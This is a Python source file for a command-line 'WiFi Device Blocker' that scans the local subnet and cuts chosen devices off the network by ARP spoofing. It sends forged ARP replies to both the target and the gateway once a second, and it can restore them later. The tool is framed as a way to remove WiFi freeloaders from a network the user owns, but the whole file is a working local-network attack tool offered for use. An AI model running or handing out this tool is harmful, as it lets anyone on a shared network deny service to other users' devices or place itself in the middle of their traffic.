"""
WiFi Device Blocker - Block/Disconnect devices from your network
This tool uses ARP spoofing to disconnect unauthorized devices from your WiFi network.
Use this to kick devices that are stealing your WiFi connection.

IMPORTANT: 
- Run as Administrator/Root for this to work.
- Requires Npcap (Windows) or root access (Linux)

Usage: python wifi_blocker.py
"""

import sys
import os
import time
import threading
import signal
import subprocess
import socket
import uuid
import logging

# Suppress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Check for admin privileges early
try:
    import ctypes
except ImportError:
    ctypes = None

def check_admin():
    """Check if running with admin/root privileges."""
    is_admin = False
    if os.name == 'nt':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            pass
    else:
        try:
            is_admin = os.geteuid() == 0
        except AttributeError:
            pass
    
    if not is_admin:
        print("[-] Error: This script must be run as Administrator/Root.")
        print("    Windows: Right-click and 'Run as Administrator'")
        print("    Linux: Use 'sudo python wifi_blocker.py'")
        sys.exit(1)

def check_npcap():
    """Check if Npcap/WinPcap is installed on Windows."""
    if os.name != 'nt':
        return True  # Not needed on Linux
    
    # Check common Npcap installation paths
    npcap_paths = [
        r"C:\Windows\System32\Npcap",
        r"C:\Windows\SysWOW64\Npcap",
        r"C:\Program Files\Npcap",
        r"C:\Program Files (x86)\WinPcap",
    ]
    
    for path in npcap_paths:
        if os.path.exists(path):
            return True
    
    # Also check if wpcap.dll exists
    if os.path.exists(r"C:\Windows\System32\wpcap.dll"):
        return True
    
    return False

# Admin check moved to WiFiBlocker.__init__() to allow import without admin
# check_admin() - REMOVED from module level

# Check for Npcap
NPCAP_INSTALLED = check_npcap()
# Note: Npcap warning removed from module level - shown only when blocking is attempted

# Import scapy with suppressed output
import warnings
warnings.filterwarnings("ignore")

from scapy.all import ARP, send, conf
conf.verb = 0  # Disable scapy verbosity


class WiFiBlocker:
    """
    WiFi Device Blocker using ARP Spoofing.
    """
    
    def __init__(self, check_privileges=True):
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_ip = None
        self.my_mac = None
        self.blocked_devices = {}  # {ip: {"mac": mac, "thread": thread, "active": bool, "success": bool}}
        self.running = True
        self.cached_devices = []
        self.npcap_available = NPCAP_INSTALLED
        self.has_admin = False
        
        # Check admin only if requested (allows import without admin)
        if check_privileges:
            self.has_admin = self._check_admin_silent()
        
        self._detect_network()
    
    def _check_admin_silent(self):
        """Check if running with admin/root privileges (silent version)."""
        is_admin = False
        if os.name == 'nt':
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception:
                pass
        else:
            try:
                is_admin = os.geteuid() == 0
            except AttributeError:
                pass
        return is_admin
        
    def _detect_network(self):
        """Detect gateway and own network info."""
        print("[*] Detecting network configuration...")
        
        try:
            # Get own IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.my_ip = s.getsockname()[0]
            s.close()
            
            # Get own MAC
            mac_int = uuid.getnode()
            mac_hex = "{:012x}".format(mac_int)
            self.my_mac = ":".join(mac_hex[i:i+2] for i in range(0, 12, 2)).upper()
            
            # Detect gateway IP
            self.gateway_ip = self._get_gateway_ip()
            
            # Ping gateway to ensure it's in ARP cache
            self._ping_host(self.gateway_ip)
            time.sleep(0.5)
            
            # Get gateway MAC from ARP cache
            self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)
            
            print(f"[+] Your IP: {self.my_ip}")
            print(f"[+] Your MAC: {self.my_mac}")
            print(f"[+] Gateway IP: {self.gateway_ip}")
            print(f"[+] Gateway MAC: {self.gateway_mac if self.gateway_mac else 'Unknown'}")
            
            if self.npcap_available:
                print("[+] Npcap: Installed - Blocking enabled")
            else:
                print("[!] Npcap: NOT installed - Blocking disabled")
            
        except Exception as e:
            print(f"[-] Error detecting network: {e}")
            sys.exit(1)
    
    def _ping_host(self, ip):
        """Ping a single host."""
        try:
            if os.name == 'nt':
                subprocess.run(
                    ["ping", "-n", "1", "-w", "500", ip],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=0x08000000
                )
            else:
                subprocess.run(
                    ["ping", "-c", "1", "-W", "1", ip],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        except Exception:
            pass
    
    def _get_gateway_ip(self):
        """Get the default gateway IP address."""
        if os.name == 'nt':
            try:
                result = subprocess.run(
                    ["ipconfig"], 
                    capture_output=True, 
                    text=True,
                    creationflags=0x08000000
                )
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Default Gateway' in line and '.' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            gateway = parts[1].strip()
                            if gateway:
                                return gateway
            except Exception:
                pass
        else:
            try:
                with open("/proc/net/route", "r") as f:
                    for line in f.readlines():
                        parts = line.strip().split()
                        if len(parts) >= 3 and parts[1] == '00000000':
                            gateway_hex = parts[2]
                            gateway_bytes = bytes.fromhex(gateway_hex)
                            return f"{gateway_bytes[3]}.{gateway_bytes[2]}.{gateway_bytes[1]}.{gateway_bytes[0]}"
            except Exception:
                pass
        
        # Fallback
        if self.my_ip:
            parts = self.my_ip.split('.')
            return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        return "192.168.1.1"
    
    def _get_mac_from_arp_cache(self, ip):
        """Get MAC address from system ARP cache."""
        try:
            if os.name == 'nt':
                result = subprocess.run(
                    ["arp", "-a", ip],
                    capture_output=True,
                    text=True,
                    creationflags=0x08000000
                )
                for line in result.stdout.splitlines():
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if "-" in part and len(part) == 17:
                                return part.replace("-", ":").upper()
            else:
                with open("/proc/net/arp", "r") as f:
                    next(f)
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 4 and parts[0] == ip:
                            mac = parts[3]
                            if mac != "00:00:00:00:00:00":
                                return mac.upper()
        except Exception:
            pass
        return None
    
    def scan_network(self):
        """Scan the network using ping sweep and ARP cache."""
        print("\n[*] Scanning network for devices...")
        
        devices = []
        
        try:
            ip_parts = self.my_ip.split(".")
            prefix = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            # Ping sweep
            print("[*] Running ping sweep (this may take a moment)...")
            self._ping_sweep(prefix)
            
            # Read ARP cache
            print("[*] Reading device information...")
            arp_entries = self._read_arp_cache()
            
            for ip, mac in arp_entries.items():
                if ip.startswith(prefix):
                    note = ""
                    if ip == self.gateway_ip:
                        note = " [GATEWAY]"
                    elif ip == self.my_ip:
                        note = " [YOU]"
                    elif ip in self.blocked_devices and self.blocked_devices[ip]["active"]:
                        note = " [BLOCKED]"
                    
                    devices.append({
                        "ip": ip,
                        "mac": mac,
                        "note": note
                    })
            
            devices.sort(key=lambda x: [int(p) for p in x["ip"].split(".")])
            self.cached_devices = devices
            
        except Exception as e:
            print(f"[-] Scan error: {e}")
        
        return devices
    
    def _ping_sweep(self, prefix):
        """Ping all IPs in subnet."""
        import concurrent.futures
        
        ips = [f"{prefix}.{i}" for i in range(1, 255)]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self._ping_host, ips)
    
    def _read_arp_cache(self):
        """Read all entries from system ARP cache."""
        entries = {}
        
        try:
            if os.name == 'nt':
                result = subprocess.run(
                    ["arp", "-a"],
                    capture_output=True,
                    text=True,
                    creationflags=0x08000000
                )
                for line in result.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 2:
                        for i, part in enumerate(parts):
                            if part.count('.') == 3:
                                try:
                                    socket.inet_aton(part)
                                    if i + 1 < len(parts):
                                        mac_part = parts[i + 1]
                                        if "-" in mac_part and len(mac_part) == 17:
                                            entries[part] = mac_part.replace("-", ":").upper()
                                except socket.error:
                                    pass
            else:
                with open("/proc/net/arp", "r") as f:
                    next(f)
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]
                            mac = parts[3]
                            if mac != "00:00:00:00:00:00":
                                entries[ip] = mac.upper()
        except Exception:
            pass
        
        return entries
    
    def _send_arp_spoof(self, target_ip, target_mac, spoof_ip):
        """Send ARP spoof packet. Returns True on success."""
        if not self.npcap_available:
            return False
        
        try:
            arp_response = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip
            )
            send(arp_response, verbose=0)
            return True
        except Exception:
            return False
    
    def _block_thread(self, target_ip, target_mac):
        """Thread function to continuously send spoof packets."""
        success_count = 0
        fail_count = 0
        
        while self.blocked_devices.get(target_ip, {}).get("active", False):
            try:
                # Tell target that gateway is at our MAC
                if self._send_arp_spoof(target_ip, target_mac, self.gateway_ip):
                    success_count += 1
                else:
                    fail_count += 1
                
                # Tell gateway that target is at our MAC
                if self.gateway_mac:
                    self._send_arp_spoof(self.gateway_ip, self.gateway_mac, target_ip)
                
                time.sleep(1)
                
            except Exception:
                fail_count += 1
                break
        
        # Update success status
        if target_ip in self.blocked_devices:
            self.blocked_devices[target_ip]["success"] = success_count > 0
    
    def block_device(self, target_ip, silent=False):
        """Start blocking a device. Returns (success, message)."""
        if not self.npcap_available:
            return (False, "Npcap not installed")
        
        if target_ip == self.gateway_ip:
            return (False, "Cannot block gateway")
        
        if target_ip == self.my_ip:
            return (False, "Cannot block yourself")
        
        if target_ip in self.blocked_devices and self.blocked_devices[target_ip]["active"]:
            return (False, "Already blocked")
        
        target_mac = self._get_mac_from_arp_cache(target_ip)
        if not target_mac:
            return (False, "MAC not found")
        
        self.blocked_devices[target_ip] = {
            "mac": target_mac,
            "active": True,
            "thread": None,
            "success": False
        }
        
        thread = threading.Thread(
            target=self._block_thread,
            args=(target_ip, target_mac),
            daemon=True
        )
        self.blocked_devices[target_ip]["thread"] = thread
        thread.start()
        
        # Wait a moment to check if it's working
        time.sleep(0.5)
        
        if self.blocked_devices[target_ip]["active"]:
            return (True, f"Blocking {target_mac}")
        else:
            return (False, "Failed to start")
    
    def block_multiple(self, indices):
        """Block multiple devices by their indices. Shows summary."""
        if not self.cached_devices:
            print("[-] Please scan for devices first (option 1).")
            return
        
        if not self.npcap_available:
            print("[-] Cannot block devices: Npcap is not installed!")
            print("    Please install Npcap from: https://npcap.com/#download")
            return
        
        results = []
        
        print("\n[*] Blocking devices...")
        
        for idx in indices:
            if 0 <= idx < len(self.cached_devices):
                device = self.cached_devices[idx]
                target_ip = device["ip"]
                success, message = self.block_device(target_ip, silent=True)
                results.append({
                    "num": idx + 1,
                    "ip": target_ip,
                    "mac": device["mac"],
                    "success": success,
                    "message": message
                })
            else:
                results.append({
                    "num": idx + 1,
                    "ip": "N/A",
                    "mac": "N/A",
                    "success": False,
                    "message": "Invalid number"
                })
        
        # Print summary
        print("\n" + "=" * 65)
        print("  BLOCK RESULTS")
        print("=" * 65)
        print(f"  {'#':<4} {'IP Address':<16} {'MAC Address':<20} {'Status'}")
        print("-" * 65)
        
        success_count = 0
        for r in results:
            status = "✓ Blocked" if r["success"] else f"✗ {r['message']}"
            print(f"  {r['num']:<4} {r['ip']:<16} {r['mac']:<20} {status}")
            if r["success"]:
                success_count += 1
        
        print("-" * 65)
        print(f"  Total: {success_count}/{len(results)} devices blocked successfully")
        print("=" * 65)
    
    def unblock_device(self, target_ip, silent=False):
        """Stop blocking a device."""
        if target_ip not in self.blocked_devices:
            if not silent:
                print(f"[-] Device {target_ip} is not being blocked.")
            return False
        
        self.blocked_devices[target_ip]["active"] = False
        
        # Restore ARP (silently - may fail without Npcap)
        if self.npcap_available and self.gateway_mac:
            target_mac = self.blocked_devices[target_ip]["mac"]
            try:
                for _ in range(3):
                    # Restore target's ARP
                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                             psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=0)
                    # Restore gateway's ARP
                    send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                             psrc=target_ip, hwsrc=target_mac), verbose=0)
                    time.sleep(0.1)
            except Exception:
                pass
        
        del self.blocked_devices[target_ip]
        return True
    
    def unblock_all(self, silent=False):
        """Unblock all devices."""
        if not self.blocked_devices:
            if not silent:
                print("[*] No devices to unblock.")
            return
        
        if not silent:
            print("\n[*] Unblocking all devices...")
        
        ips = list(self.blocked_devices.keys())
        for ip in ips:
            self.unblock_device(ip, silent=True)
        
        if not silent:
            print(f"[+] Unblocked {len(ips)} device(s)")
    
    def list_blocked(self):
        """List all currently blocked devices."""
        if not self.blocked_devices:
            print("\n[*] No devices are currently blocked.")
            return
        
        print("\n" + "=" * 55)
        print("  CURRENTLY BLOCKED DEVICES")
        print("=" * 55)
        print(f"  {'IP Address':<18} {'MAC Address':<20} {'Status'}")
        print("-" * 55)
        
        for ip, info in self.blocked_devices.items():
            status = "Active" if info["active"] else "Stopping"
            print(f"  {ip:<18} {info['mac']:<20} {status}")
        
        print("-" * 55)
        print(f"  Total: {len(self.blocked_devices)} device(s)")
        print("=" * 55)


def print_menu():
    """Print the main menu."""
    print("\n" + "=" * 55)
    print("       WiFi Device Blocker v2.0")
    print("       Kick WiFi Thieves Off Your Network!")
    print("=" * 55)
    print("\n  1. Scan for devices")
    print("  2. Block device(s) - enter: 1 2 3 or 1,2,3")
    print("  3. Unblock a device")
    print("  4. List blocked devices")
    print("  5. Unblock all devices")
    print("  6. Exit")
    print("\n" + "-" * 55)


def parse_device_numbers(input_str):
    """Parse device numbers from user input."""
    input_str = input_str.replace(",", " ")
    parts = input_str.split()
    
    indices = []
    for part in parts:
        try:
            num = int(part.strip())
            indices.append(num - 1)
        except ValueError:
            pass
    
    return indices


def main():
    """Main function to run the WiFi blocker."""
    blocker = WiFiBlocker()
    
    def signal_handler(sig, frame):
        print("\n\n[*] Exiting... Cleaning up...")
        blocker.unblock_all(silent=True)
        print("[+] Done. Goodbye!")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    while True:
        print_menu()
        choice = input("  Enter your choice (1-6): ").strip()
        
        if choice == "1":
            devices = blocker.scan_network()
            if devices:
                print("\n" + "=" * 65)
                print("  NETWORK DEVICES")
                print("=" * 65)
                print(f"  {'#':<4} {'IP Address':<16} {'MAC Address':<20} {'Note'}")
                print("-" * 65)
                for i, device in enumerate(devices, 1):
                    print(f"  {i:<4} {device['ip']:<16} {device['mac']:<20} {device['note']}")
                print("-" * 65)
                print(f"  Total: {len(devices)} devices found")
                print("=" * 65)
            else:
                print("[-] No devices found.")
        
        elif choice == "2":
            if not blocker.cached_devices:
                print("[-] Please scan for devices first (option 1).")
                continue
            
            print("\n[*] Enter device number(s) to block:")
            print("    Examples: '2' or '1 3 5' or '1,2,3'")
            target = input("  > ").strip()
            
            indices = parse_device_numbers(target)
            if indices:
                blocker.block_multiple(indices)
            else:
                print("[-] No valid device numbers entered.")
        
        elif choice == "3":
            blocker.list_blocked()
            if not blocker.blocked_devices:
                continue
            
            print("\n[*] Enter the IP address to unblock (or 'all'):")
            target_ip = input("  > ").strip()
            
            if target_ip.lower() == 'all':
                blocker.unblock_all()
            else:
                if blocker.unblock_device(target_ip):
                    print(f"[+] Unblocked: {target_ip}")
        
        elif choice == "4":
            blocker.list_blocked()
        
        elif choice == "5":
            blocker.unblock_all()
        
        elif choice == "6":
            print("\n[*] Cleaning up...")
            blocker.unblock_all(silent=True)
            print("[+] Goodbye!")
            break
        
        else:
            print("[-] Invalid choice. Please enter 1-6.")


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         WiFi Device Blocker v2.0                          ║
    ║         Block unauthorized devices from your network      ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  REQUIREMENTS:                                            ║
    ║  • Run as Administrator                                   ║
    ║  • Npcap installed (https://npcap.com)                    ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  WARNING: Use only on networks you own/manage!            ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    main()
